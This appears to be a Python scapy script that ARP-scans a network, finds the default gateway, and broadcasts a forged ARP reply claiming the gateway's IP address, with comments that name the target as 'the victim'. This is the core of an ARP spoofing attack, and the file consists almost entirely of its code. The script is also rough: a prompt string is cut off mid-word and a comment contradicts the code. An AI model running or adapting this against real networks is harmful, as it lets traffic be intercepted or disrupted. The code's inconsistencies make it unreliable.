import scapy.all as scapy
import subprocess
import sys
import time
import os
from ipaddress import IPv4Network
import threading


def arp_scan(ip_range):
 # We create an empty list where we will store the pairs of ARP responses.
    arp_responses = list()
    # We send arp packets through the network, verbose is set to 0 so it won't show any output.
    # scapy's arping function returns two lists. We're interested in the answered results which is at the 0 index.
    answered_lst = scapy.arping(ip_range, verbose=1)[0]

    # We loop through the answered results and append the ip address and mac address to the arp_responses list.     
    for element in answered_lst:
        arp_responses.append((element[1].psrc, element[1].hwsrc))
    return arp_responses


def get_gateway():
    # We use the command "ip route" to get the default gateway.
    return subprocess.check_output("ip route | grep default", shell=True).decode("utf-8").split()[2]    
    

if __name__ == '__main__':
    iprange = input("Please enter the ip address and range that you want to send the ARP request to (ex")
    results = arp_scan(iprange)
    gateway = get_gateway()
    
    #enumerate results  and print them
    for i, result in enumerate(results):
        print(f"{i + 1}) {result[0]} {result[1]}")
    print("\n")

    print("The default gateway is: " + gateway)
    print("\n")


    # We create a packet with the destination ip address of the victim and the source ip address of the gateway.
    packet = scapy.ARP(pdst=iprange, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway)
    # We create a broadcast packet with the destination ip address of the victim and the source ip address of the gateway.
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # send it through the network
    broadcast_packet.show()
    scapy.sendp(broadcast_packet/packet, verbose=0)





